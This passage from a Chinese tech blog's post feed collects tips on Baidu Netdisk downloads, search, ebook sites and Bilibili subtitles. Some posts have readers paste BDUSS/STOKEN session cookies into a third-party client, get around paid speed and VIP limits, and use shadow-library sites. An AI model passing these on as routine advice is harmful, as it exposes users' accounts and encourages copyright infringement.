Pie() .add("", [list(z) for z in zip(names, counts)],radius=["40%", "75%"], ) .set_global_opts(title_opts=opts.TitleOpts(title="饼图",pos_left="center",pos_top="20")) .set_global_opts(legend_opts=opts.LegendOpts(type_="scroll", pos_left="80%", orient="vertical")) .set_series_opts(label_opts=opts.LabelOpts(formatter="&#123;b&#125;: &#123;d&#125;%"), ))pie.render('pie.html') 统计出前50的电影列表： 肖申克的救赎, 霸王别姬, 阿甘正传, 海上钢琴师, 怦然心动, 泰坦尼克号, 当幸福来敲门, 教父, 这个杀手不太冷, 美丽人生, 大话西游, 千与千寻, 星际穿越, 熔炉, 三傻大闹宝莱坞, 楚门的世界, 盗梦空间, 活着, 素媛, 忠犬八公的故事, 被嫌弃的松子的一生, 辛德勒的名单, 无间道, 七号房的礼物, 情书, 让子弹飞, 放牛班的春天, 初恋这件小事, 死亡诗社, 美国往事, 我不是药神, 搏击俱乐部, 心灵捕手, 西西里的美丽传说,天堂电影院, 闻香识女人, 喜剧之王, 假如爱有天意, 傲慢与偏见, 绿皮书, 触不可及, 功夫, 辩护人, 乱世佳人, 看不见的客人, 大鱼, 东邪西毒, 低俗小说, 断背山。 Python生成的饼图可以看到电影《肖申克的救赎》以2951的提及次数遥遥领先，不愧为豆瓣电影 Top 250 排第一 https://movie.douban.com/top250 ，紧随其后的是张国荣《霸王别姬》。 如果想找以上电影看看之前文章2020 最全百度网盘搜索，找电影资源不再愁 ，应该都能找到。 大家的点赞和在看转发对我非常重要，如果文章对你有帮助还请支持下， 感谢各位！ 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 一键下载公众号所有文章 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中秋/国庆节发福利了，小伙伴们来领现金红包]]></title>
    <url>%2F2020%2F10%2F16%2F%E4%B8%AD%E7%A7%8B-%E5%9B%BD%E5%BA%86%E8%8A%82%E5%8F%91%E7%A6%8F%E5%88%A9%E4%BA%86%EF%BC%8C%E5%B0%8F%E4%BC%99%E4%BC%B4%E4%BB%AC%E6%9D%A5%E9%A2%86%E7%8E%B0%E9%87%91%E7%BA%A2%E5%8C%85%2F</url>
    <content type="text"><![CDATA[熬过漫长的这周，终于等到了中秋和国庆，8天长假你打算怎么过呢，可以在文章末尾评论分享下。 之前8月底发过福利 发福利了，小伙伴们来领现金红包 ，现在轮到发9月的福利了。 首先是9月份在文章末尾评论天数前10的小伙伴（评论仅限文章发布当天）。 jinfeng ，我还是太年轻啊 ，小螺号，_，精灵大人的Identity， Schimidt ，чυ， 奇点，废柴攻城狮，啊，超 微信昵称叫 jinfeng 的小伙伴坚持评论了19天（包括我删掉的广告文章），获得100块，接着是 我还是太年轻啊 和 小螺号 评论了18天，各获得50块，余下的小伙伴每人18块，没加我微信的加下我，加过的给我发条微信提醒下。 今天就进入10月了，大家可以开始评论打卡了，如果这个月评论打卡人数增加的话可以扩大到发20个小伙伴。 ps: 话说光做这个统计我就花费了1个多小时，之后我研究下用Python抓取评论来统计。 除了上面10位小伙伴，另外发个抽奖，公众号后台回复 抽奖 进入小程序抽奖，就抽2人各50块，10月2号10点开奖，中奖后可直接提现到微信钱包。 目前公众号已发布178篇原创，也是不容易。 公众号每周更新2-3篇原创文章，一般是早上8点20发，没有标题党，但愿没有浪费你时间，还能对你有所帮助。 大家有兴趣可以在菜单栏中点击历史文章进入文章列表查看。 也可以打开公众号右上角的搜索按钮查找你想看的文章。比如输入 去logo 就能找到这篇文章如何更优雅地看电影/刷剧 ，里面有详细说明如何去除腾讯优酷和爱奇艺视频上方的logo。 另外我还用Python下载了我的公众号文章一键下载公众号所有文章，导出文件支持PDF，HTML，Markdown，Excel，chm等格式，在后台回复 公众号 可以获取公众号文章PDF，HTML格式文件。 最后说下，由于现在公众号信息流乱序了，已经不按时间倒序来展示你关注的公众号更新，如果不想错过我的文章，麻烦将本公众号设置为星标，这样就不用在你关注的那么多公众号里翻了 。 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020年10月最新免费加速下载百度网盘文件方法]]></title>
    <url>%2F2020%2F10%2F13%2F2020%E5%B9%B410%E6%9C%88%E6%9C%80%E6%96%B0%E5%85%8D%E8%B4%B9%E5%8A%A0%E9%80%9F%E4%B8%8B%E8%BD%BD%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[苏生不惑第184 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于百度网盘之前已经写过很多文章了，有兴趣可点击阅读： 2020 年 3 月最新加速下载百度网盘文件方法 2020 年 4 月使用 Aria2 加速下载百度网盘文件 2020 最全百度网盘搜索，找电影资源不再愁 没有提取码怎么获取百度网盘资源？ 2020年7月最新加速下载百度网盘文件方法 2020年8月最新免费加速下载百度网盘文件方法 之前分享的网盘解析站 http://pan.naifei.cc/ 已经挂了，但野火烧不尽，又有了新的工具诞生，这里再做个整理。 idm配合油猴脚本关于油猴之前文章已经介绍过了实用油猴脚本推荐，让你的谷歌浏览器更强大，油猴Chrome扩展地址https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=zh-CN ，如果上不了谷歌参考之前文章 上不了谷歌如何安装 Chrome 扩展？ 或者公众号后台回复 网盘 手动安装，这款扩展有1000万+用户安装过，值得信赖，强烈推荐安装。 安装Chrome扩展后安装这个网盘助手脚本 https://greasyfork.org/zh-CN/scripts/378301 这个脚本主要功能有获取百度网盘、腾讯微云、蓝奏云、天翼云盘的提取码 ，百度网盘生成并展示下载链接，百度网盘分享时自定义提取码，解除一分钟观看限制。 直接点击安装，因为我已经安装过了，所以显示重新安装。 接下来配合使用软件 idm （公众号后台回复 网盘 获取idm软件，如果你是Mac系统使用ndm）来加速下载百度网盘文件，选中文件后点击生成链接会弹出提示2个下载链接，官方和直链地址。右键下载地址选择使用idm下载。弹出下载框，点击开始下载。 如果出现400，403等错误先确认下是否在你的网盘主页下载的，而不是分享页，还不行可以更改应用id 为 265486、309847，266719或者778750。 下载速度能达到2MB/s（因人而异，你的可能更快）。 看我录制的GIF动图。 pandownloadpandownload 应该很多人用过，之前挂了，不过现在又有人重新复活了它（公众号后台回复 网盘 获取软件）。 下载后直接双击打开软件（需要允许防火墙访问），然后使用cookie登录你的百度网盘账号（也可以使用账号密码登录，我是不放心），关于如何使用cookie登录百度网盘可以参考这篇文章，很全面http://pandownload.com/faq/cookie.html 打开百度网盘主页控制台，application里可以看到cookie，复制BDUSS和STOKEN，格式为 BDUSS=xxx; STOKEN=xxx复制cookie直接登录。登录后会显示你的文件。 选择一个文件右键下载。 下载速度接近1MB/s （跟你的网络有关）。 除了客户端软件它还有网页版 https://b.cve.workers.dev/ ，输入网盘链接和提取码。 成功获取下载链接。 用idm下载这个链接需要设置下ua，详情见 https://b.cve.workers.dev/help ，打开idm软件 选项 -&gt; 下载 -&gt; user-agent里填入 LogStatistic 然后在 IDM 新建任务，粘贴链接即可下载。 网盘下载地址提取这是个Windows软件（公众号后台回复 网盘 获取软件），直接输入网盘链接和提取码。它会自动帮你复制下载地址，打开idm新建任务下载即可。 顺便分享一个磁力资源搜索助手，可以很方便的获取资源磁力链接，然后使用迅雷这样的软件下载。 话说阿里最近也推出了一款不限速、不打扰、够安全、易于协作的阿里云网盘，不过目前还在内测 https://www.teambition.com/products/pan ，期待下。 最后说个题外话，之前我写过一篇文章使用油猴脚本去除腾讯优酷爱奇艺视频右上角的logo如何更优雅地看电影/刷剧，有小伙伴加我微信说能不能录制个视频讲解下，正好之前建的微信视频号一直没用，大家觉得有必要的话我折腾下，不过不知道效果怎么样，毕竟没这方面经验。 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何让你的搜索更高效]]></title>
    <url>%2F2020%2F09%2F30%2F%E5%A6%82%E4%BD%95%E8%AE%A9%E4%BD%A0%E7%9A%84%E6%90%9C%E7%B4%A2%E6%9B%B4%E9%AB%98%E6%95%88%2F</url>
    <content type="text"><![CDATA[苏生不惑第178 篇原创文章，将本公众号设为星标，第一时间看最新文章。 这周四就是国庆节长假了，大家的心情可能都是这样的。 举牌小人地址http://www.atoolbox.net/Tool.php?Id=789 https://www.jiuwa.net/jupai/ 关于搜索之前分享过 那些你可能不知道的搜索奇技淫巧 ，2020 最全百度网盘搜索，找电影资源不再愁 ，2020 最全电子书搜索网站，找电子书不再愁 ，今天分享的是如何让你的搜索更高效。 先吐槽下，国内的互联网越来越不互联了，比如手机端看全文必须下载APP，有些产品（比如闲鱼）甚至没有网页端，robot.txt禁止搜索引擎抓取，把一个个APP的内容封闭起来，于是我们手机上安装的APP越来越多。 能用网页版我是不会安装APP的，电脑键盘打字多爽，大屏幕多爽，这里还是要点赞下b站和知乎，搜索引擎可以很方便的找到内容，不下载APP也完全可以使用他们的产品。 去广告在百度搜索拼多多，第一个结果是个广告，居然不是拼多多官网，毕竟人家是给了钱的。 相比之下谷歌搜索就好多了，第一个就是官网，所以我一直推荐大家使用谷歌搜索和谷歌浏览器 ，谷歌还有很多产品 那些在国内还能使用的谷歌产品 不过大多数人还是用百度居多，这里推荐一个 Chrome 扩展 广告终结者 ，它可以清除网页上的浮动广告，购物广告，恶意弹窗，跟踪代码，让你浏览网页更快更清爽， 而且支持绝大多数浏览器。Chrome扩展地址https://chrome.google.com/webstore/detail/%E5%B9%BF%E5%91%8A%E7%BB%88%E7%BB%93%E8%80%85/fpdnjdlbdmifoocedhkighhlbchbiikl?hl=zh-CN ，安装Chrome扩展方法见之前文章上不了谷歌如何安装 Chrome 扩展？ 安装扩展后再次百度搜索没有垃圾广告了，第一个就是官网，搜索效率明显提高了。 除了去除网页广告，它还有个实用功能就是去除视频广告，比如腾讯，优酷，爱奇艺这样的影视网站， 45秒的开头广告 。 安装好这个扩展后再次打开爱奇艺可以看到广告一晃而过就开始播放视频，看我录制了的GIF。 搜索引擎快捷跳转这是个油猴脚本https://greasyfork.org/zh-CN/scripts/27752-searchenginejump ，可以方便的在各个搜索引擎之间跳转,增加可视化设置菜单,能更友好的自定义设置,修复百度搜索样式丢失的问题。 关于油猴脚本之前介绍过很多次了，公众号后台回复 油猴 获取，安装详情见文章实用油猴脚本推荐，让你的谷歌浏览器更强大 搜索框下方列出了网页，翻译，知识，图片，视频，音乐，社交，购物等搜索网站快捷方式，可以直接进入这些网站搜索对应关键词。 对百度搜索同样有效。 网址还可以自定义。 搜索黑名单有时候不想在搜索结果看到某些网站，可以安装搜索过滤扩展 uBlacklist https://chrome.google.com/webstore/detail/ublacklist/pncfbmialoiaghdehhbnbhkkgmjanfhe/related，方便你搜索的时候不看某些垃圾网站的搜索结果。 对于某些专门采集数据的垃圾网站，推荐安装扩展终结内容农场 https://chrome.google.com/webstore/detail/content-farm-terminator/lcghoajegeldpfkfaejegfobkapnemjl ，在搜索结果会有标识 https://www.hotbak.net/打开后会有提示。 右键搜一个优秀的右键菜单 Chrome 扩展程序（公众号后台回复 谷歌 获取） https://github.com/xuender/cm/releases https://www.lanzoux.com/iWgaXet03xe ，右键菜单增加了跳转扩展程序，书签管理，插件，创建短网址，生成二维码等功能。菜单可以自定义。 搜索技巧用《》来搜索书籍或者电影，比如 《明朝那些事儿》，如果搜电子书在书名关键词后加上文件格式，如 pdf/epub/mobi/azw3/txt等 比如 明朝那些事儿 filetype:pdf或者 明朝那些事儿 inurl:pdf，搜出的结果都是PDF文件。 site 站点搜索，比如在b站搜索 周杰伦 site:bilibili.com 周杰伦，百度搜索工具里可以直接输入站点搜索，类似的语法还有查询天气 weather: 北京，查询股票stocks: 微博，查询地图map: 北京，查询电影movie: 夺冠，查询新闻源source: 国庆放假安排 。 数字间隔搜索，比如2000年到2010年的奥斯卡 奥斯卡 2000...2010模糊搜索，比如想找一首歌，只记得歌词里的几个字，搜索 *爱你很久很轻易的找到周杰伦的《晴天》。 搜索允许目录浏览的网站，比如 index of 电影可以搜到很多人的私人网盘。这个告诫我们千万别把自己的私人网盘放公网，万一放了某些不可描述的东西。 更多谷歌浏览器的实用技巧见之前文章 那些你可能不知道的谷歌浏览器实用技巧 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法和九宫格图片 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 一键下载公众号所有文章 抖音 一键下载无水印抖音视频 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[宝藏网站系列：这个网站号称万能]]></title>
    <url>%2F2020%2F09%2F30%2F%E5%AE%9D%E8%97%8F%E7%BD%91%E7%AB%99%E7%B3%BB%E5%88%97%EF%BC%9A%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%B7%E7%A7%B0%E4%B8%87%E8%83%BD%2F</url>
    <content type="text"><![CDATA[苏生不惑第177篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过宝藏网站 https://www.heji.ltd/ 这个网站堪称宝藏，收藏起来吧 ，今天分享的是宝藏网站系列之万能命令https://wanneng.run/cn/ ,它将各种高质量的在线工具按应用站点聚合起来，让你以方便快捷好记的方式寻找和使用网页型在线工具 。 浏览任意网页时，输入这个万能命令 wn.run/ 或点击一下固定的书签，就会展示出用于该网页的各种附加在线工具，比如 快速查看该网页历史存档(网页被删了找回)、下载该网页的视频音乐文件(默认无法下载或需要安装app登陆等)、快速网页翻译(默认手机端网页翻译会比较繁琐)、快速网页长截图、查看电商历史价格等，并且点击工具时一般会直达针对该网页的功能详情页。 使用起来很简单，在任何网页的网址前面加上 wn.run/ 即可展示用于该网页的在线工具，比如 b站视频 https://www.bilibili.com/video/BV1ip4y1D7iY 加上后变成 https://wn.run/https://www.bilibili.com/video/BV1ip4y1D7iY ，可以看到针对bilibili站点可用的在线工具。 视频音乐下载推荐了parsevideo，videofk，视频鱼，ibilibili，kanbilibili，weibomiaopai 等下载网站，这里选择视频鱼 http://www.shipinyu.cn/video?url=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1ip4y1D7iY&amp;page=video ，在线就能下载b站视频了。 查历史价格推荐了 tool168.cn，zhushou.huihui.cn 等在线查看商品历史价格，防止被商家先升价后降价促销。支持淘宝、天猫、京东、苏宁、当当、网易考拉、亚马逊等商品网址。 网页翻译推荐了搜狗翻译，百度翻译，谷歌翻译等网站。 输入网址可以全文翻译，看外文网站很需要。 查看网页历史记录推荐了2tool.top，web.archive.org 等查看网页历史记录网站，之前文章也介绍过 再谈备份网页和公众号文章。进入第一个可以看到这个b站视频在360和谷歌搜索有快照，如果这个视频删了 ，还能在快照里找到。 查看当前站点油猴脚本推荐了b站可用的油猴脚本。进入https://greasyfork.org/zh-CN/scripts/by-site/bilibili.com 可以看到适用b站的各种脚本 ，关于油猴脚本的强大可以看之前文章实用油猴脚本推荐，让你的谷歌浏览器更强大 ，强烈建议你安装使用。 网页截图推荐了image.thum.io，screen.guru，web2pdfconvert.com 等在线截图网站。实现了对网站在线截图，当然这个截图会有点慢，推荐使用之前分享的工具如何优雅的对网页截取长图 生成网址二维码推荐了api.qrserver.com，cli.im 等在线生成二维码网站。 这个b站视频生成的二维码效果如下。 网页转pdf推荐了web2pdfconvert.com，zh.pickfrom.net，tools.pdf24.org等在线生成网页PDF网站。 生成短网址推荐微博和suo.im短链接生成网站，比如生成一个 http://suo.im/6pSJxx ，有些平台禁止发布某些域名，可以尝试用短链接，关于短连接之前也写过文章 网址太长了难看？生成个短网址吧 网站工具推荐了alexa.com，seo.chinaz.com，www.aizhan.com 等查看b站的网站排名。 b站ALEXA世界排名117，国内33，算是头部网站了。 更多工具可以查看 https://wanneng.run/fu/tags.php，这里列出了针对n多网站的工具。比如微博域名下的几十个工具 https://wanneng.run/fu/tool_list.php?site=weibo.com 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法和九宫格图片 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 一键下载公众号所有文章 抖音 一键下载无水印抖音视频 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020 最全电子书搜索网站，找电子书不再愁]]></title>
    <url>%2F2020%2F09%2F30%2F2020-%E6%9C%80%E5%85%A8%E7%94%B5%E5%AD%90%E4%B9%A6%E6%90%9C%E7%B4%A2%E7%BD%91%E7%AB%99%EF%BC%8C%E6%89%BE%E7%94%B5%E5%AD%90%E4%B9%A6%E4%B8%8D%E5%86%8D%E6%84%81%2F</url>
    <content type="text"><![CDATA[苏生不惑第176 篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过找电影电视剧网站 2020 最全百度网盘搜索，找电影资源不再愁 ，今天再分享下找电子书资源网站。 中文电子书https://www.jiumodiary.com/ 鸠摩搜书这个电子书搜索引擎比较知名，搜索结果支持 epub，TXT，PDF，mobi等格式。 http://www.toplinks.cc/s/ 淘链客，主要收集文档类资源下载链接的聚合型搜索引擎网站，下载链接来自百度网盘、微盘、城通、蓝奏云等网盘及其他第三方网站。 https://www.kgbook.com/ 电子书分享平台苦瓜书盘是供网友交流适合电纸书阅读的6寸pdf及mobi格式电子书制作技术的网站。 http://www.banshujiang.cn/ 搬书匠供大量编程类电子书免费下载，根据语音，数据库，年份等分类整理。 号称最大的电子书库epubee http://cn.epubee.com/books/ 英文电子书http://www.qcenglish.com/ 一个英文电子书下载站七彩英语 ，支持PDF和TXT格式，提供2249本英文原版原著下载。 http://gen.lib.rus.ec/ 一个文献在线查询和下载的公益网站Library Genesis ，主要是英文原版的电子书和期刊论文，据说藏书多达100万本，其中也有少量的中文资料 。 其他类似网站还有 http://www.gutenberg.org/ ，http://manybooks.net，https://b-ok.cc/ 。 在线图书馆https://zh.booksc.org/ booksc是世界上最大的在线图书馆之一，拥有超过533万册书籍以及7752万个文献，大多是pdf、djvu、eupb格式，直接搜书名或文章题目即可搜索下载，无需注册，很方便。 https://pup6.yunzhan365.com/bookcase/kiru/index.html 北大出版社电子教材书架，目前提供 680 多册不同专业的教材，支持关键词搜索，也可以按学科进行筛选。在线阅读效果不错。 http://www.ndlib.cn/ 数字图书馆推广工程汇集国内各省市图书馆，提供免费的图书、杂志、有声读物在线浏览，分类齐全，资源众多，可切换国内任一家图书馆。与各大高校图书馆合作的全国图书馆参考咨询联盟 http://www.ucdrs.superlib.net/ 电子书网站导航https://ebook.chongbuluo.com/ 虫部落集合了几十个电子书网站，切换到对应网站搜索即可。 https://ebook.huzerui.com/ 熊猫搜书聚合了 22 个高质量电子书搜索网站 ，提供 mobi、epud、pdf、txt，kindle等格式下载。 http://shu.ziyuandi.cn 电子书资源帝，集合了上百个电子书网站。 油猴脚本关于油猴脚本之前分享过很多了实用油猴脚本推荐，让你的谷歌浏览器更强大 ， 油猴脚本豆瓣资源下载大师让你 1 秒搞定豆瓣电影 | 音乐 | 图书下载 https://greasyfork.org/zh-CN/scripts/329484 。 安装脚本后在豆瓣图书 https://book.douban.com/subject/3674537/ 右侧可以看到推荐的搜索结果相当全面，包含在线阅读，图书搜索·，免费图书网站，在线听书，再也不用你一个个搜索了，之前文章也介绍过 搜不到你想看的书/音乐/电影？一个油猴脚本帮你搞定 搜索引擎如果上面那么多网站还没找到，还有万能的谷歌，搜电子书时，在书名关键词后加上文件格式，如 pdf/epub/mobi/azw3/txt等 比如 明朝那些事儿 filetype:pdf，搜出的结果都是PDF文件。 每本书都有国际标准书号 isbn 号 ,比如 《乌合之众》为 9787801093660 https://book.douban.com/subject/1012611/ ，直接搜索 inurl:9787801093660 可找到这本书。 最后推荐个网站 一生必读的100 本书 https://www.100ben.net/ ，收录了世界名著，全球知名小说和传记等，可在线查看 ​​​​。 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法和九宫格图片 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 一键下载公众号所有文章 抖音 一键下载无水印抖音视频 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[下载b站外挂字幕,用 potplayer 播放器播放视频也能看字幕了]]></title>
    <url>%2F2020%2F09%2F30%2F%E4%B8%8B%E8%BD%BDb%E7%AB%99%E5%A4%96%E6%8C%82%E5%AD%97%E5%B9%95-%E7%94%A8-potplayer-%E6%92%AD%E6%94%BE%E5%99%A8%E6%92%AD%E6%94%BE%E8%A7%86%E9%A2%91%E4%B9%9F%E8%83%BD%E7%9C%8B%E5%AD%97%E5%B9%95%E4%BA%86%2F</url>
    <content type="text"><![CDATA[苏生不惑第175 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于b站之前已经写过很多文章了，有兴趣可以点击阅读： bilibili(b站)升级到BV号了，还想用av号怎么办？ 那些你可能不知道的 bilibili 奇技淫巧 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 如何更优雅地使用 bilibili(b站) 如何找回bilibili(b站)收藏夹里失效的视频？ 如何免登陆观看b站大会员番剧 借助 potplayer 播放器，在本地播放 b 站视频也能看弹幕了 今天分享的是下载b站外挂字幕 ，在本地用 potplayer 播放器播放b站视频也能看字幕了，需要用到 potplayer 播放器 （公众号后台回复 播放器 获取软件）和字幕文件。 b站字幕b站的外挂字幕是2018年上线的，详情看官方文章 https://www.bilibili.com/read/cv1374773/b站的外挂CC字幕其实就是个 srt 文件，这是一种非常流行的文本字幕，内容为一行时间，一行字幕，制作规范非常简单。 有字幕的视频可以在底部看见cc字样（客户端也有），比如这个 https://www.bilibili.com/video/BV1Jt411P77c?p=2 有中英文字幕，对于没有字幕的视频还可以自己添加字幕（ass格式文），up主审核通过后就可以看到了。 通过控制台可以找到字幕json文件https://i0.hdslb.com/bfs/subtitle/9d71b0913bed9966fcccb99d211208d31290ad09.json可以看到字幕文件内容。 下载字幕找到字幕文件就很好下载了，不过这个字幕文件是json格式，我们需要的是srt格式，因此需要转换下，这里可以使用Python脚本 https://github.com/taseikyo/backup-utils/blob/master/Python/008_download_and_convert_b23_subtitle.py 来完成。 直接输入b站地址执行脚本下载，本地会生成一个srt文件。12λ python bilibili.py请输入b站地址:https://www.bilibili.com/video/BV1Jt411P77c?p=2 当然用代码还是有点麻烦，已经有油猴脚本了 https://greasyfork.org/zh-TW/scripts/378513-bilibili-cc%E5%AD%97%E5%B9%95%E5%B7%A5%E5%85%B7 ，关于油猴脚本下载使用参考之前文章实用油猴脚本推荐，让你的谷歌浏览器更强大点击下载可以看到字幕内容，下载格式支持ass,srt等。 如果你觉得安装油猴插件还是麻烦推荐这个用于下载B站CC字幕及转换的工具BiliBiliCCSubtitle （公众号后台回复 b站 获取） https://github.com/nathanli97/BiliBiliCCSubtitle 在命令行执行 ccdown.exe -d -c https://www.bilibili.com/video/BV1Jt411P77c?p=2 即可下载json格式和srt格式字幕文件。123456λ ccdown.exe -d -c https://www.bilibili.com/video/BV1Jt411P77c?p=2Bilibili JSON format CC subtitle downloader Ver 1.1.0 by Nathanli97Found: zh-Hans 中文（简体） ==&gt; AV60977932(BV1Jt411P77c)-P2-zh-Hans.jsonAV60977932(BV1Jt411P77c)-P2-zh-Hans.json ==&gt; AV60977932(BV1Jt411P77c)-P2-zh-Hans.srtFound: en-US 英语（美国） ==&gt; AV60977932(BV1Jt411P77c)-P2-en-US.jsonAV60977932(BV1Jt411P77c)-P2-en-US.json ==&gt; AV60977932(BV1Jt411P77c)-P2-en-US.srt 下载视频下载字幕后再下载b站视频，之前已经分享过工具 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ ，我喜欢用命令行下载。1234567891011121314λ annie -f 16 https://www.bilibili.com/video/BV1Jt411P77c?p=2 Site: 哔哩哔哩 bilibili.com Title: 普林斯顿大学丨算法第四版 Princeton University 丨 Algorithms Part 1 P2 01_dynamic-connectivity 动态连通性 Type: video Stream: [16] ------------------- Quality: 流畅 360P Size: 21.35 MiB (22385288 Bytes) # download with: annie -f 16 ... 21.35 MiB / 21.35 MiB [================================================] 100.00% 3.08 MiB/s 6s Merging video parts into 普林斯顿大学丨算法第四版 Princeton University 丨 Algorithms Part 1 P201_dynamic-connectivity 动态连通性.mp4 下载字幕和视频文件后，将字幕和视频文件名改成一样，比如普林斯顿大学丨算法第四版.mp4 和 普林斯顿大学丨算法第四版.srt，播放 视频就能看到字幕了 。 如果还想看弹幕参考之前文章 借助 potplayer 播放器，在本地播放 b 站视频也能看弹幕了 下载弹幕文件也能看了。 除了工具还有在线网站下载https://wivwiv.com/youtube ，不过只支持av号地址https://www.bilibili.com/video/av60977932?p=2 最后分享个神器彩云小译Chrome扩展 https://chrome.google.com/webstore/detail/lingocloud-web-translatio/jmpepeebcbihafjjadogphmbgiffiajh ，这个扩展能让你看外文视频的时候自动翻译为中文，安装Chrome扩展见之前文章 上不了谷歌如何安装 Chrome 扩展？ ，安装扩展后可以看到视频翻译。 点击视频翻译后开启音频识别 。比如这个视频（其实不限制于b站，任何视频网站都可以） https://www.bilibili.com/video/BV1g7411K7ut ，可以实时看到下面翻译的中文字幕，效果不错。 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法和九宫格图片 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 一键下载公众号所有文章 抖音 一键下载无水印抖音视频 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[王菲k歌又上微博热搜，Python分析下微博网友评论]]></title>
    <url>%2F2020%2F09%2F18%2F%E7%8E%8B%E8%8F%B2k%E6%AD%8C%E5%8F%88%E4%B8%8A%E5%BE%AE%E5%8D%9A%E7%83%AD%E6%90%9C%EF%BC%8CPython%E5%88%86%E6%9E%90%E4%B8%8B%E5%BE%AE%E5%8D%9A%E7%BD%91%E5%8F%8B%E8%AF%84%E8%AE%BA%2F</url>
    <content type="text"><![CDATA[苏生不惑第174篇原创文章，将本公众号设为星标，第一时间看最新文章。 最近王菲状态话题上了微博热搜 https://weibo.com/1266269835/JjRLJ4Ygi https://weibo.com/6598655984/JjRSUrBi7 还和马云合唱了 如果云知道 https://weibo.com/1956700750/JjWgLhrau 5年不更新的微博下评论开始求开演唱会 https://weibo.com/1629810574/C8FqitZ9X 于是用Python抓取了下这条微博下的评论（前几十页评论），微博有4个域名： 网页版weibo.com ，手机端 m.weibo.com，移动端weibo.cn ，h5端 m.weibo.cn ，这里用网页版为例，打开控制台可以抓取到评论接口https://weibo.com/aj/v6/comment/big?ajwvr=6&amp;id=3820658587146613 同样的移动端 https://weibo.cn/search/?tf=5_012 搜王菲可以找到这条微博https://weibo.cn/comment/C8FqitZ9X ，评论也在一块。 还有h5端 https://m.weibo.cn/detail/3820658587146613 抓取到接口https://m.weibo.cn/comments/hotflow?id=3820658587146613&amp;mid=3820658587146613&amp;max_id=232827256891053&amp;max_id_type=0 有了接口地址，数据就很好抓取了，这里写入文件。然后用wordcloud对微博评论生成词云图，主要关键词是好听，菲姐，演唱会，真的很期待王菲再开演唱会。 也可以通过网站 http://cloud.niucodata.com/ 生成，上传文字即可。 另外我用Chrome扩展备份了王菲1500多条微博，详情见之前文章用Chrome扩展一键备份微博如果需要备份文件在公众号后台回复 微博 获取https://www.lanzoux.com/iIFWcgjb79c 天后已经很久不出专辑了，自从去年发了一首单曲《我和我的祖国》快过去一年了，不过即使20年前的歌今天依然在传唱 王菲51岁：爱她，不只是因为她的歌，比如《红豆》https://music.163.com/#/song?id=299936，可惜目前在网易云音乐需要VIP才能听，如果不想花钱看看之前文章[一键解锁网易云音乐变灰歌曲](https://mp.weixin.qq.com/s/BSfjFnv54EAHmc6eE75T9g)这里抓取前200页的评论生成词云图，我也很喜欢这首歌。 评论接口地址http://music.163.com/api/v1/resource/comments/R_SO_4_299936?limit=20&amp;offset=0 你喜欢听王菲吗？喜欢她哪首歌，可以在文末留言。 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 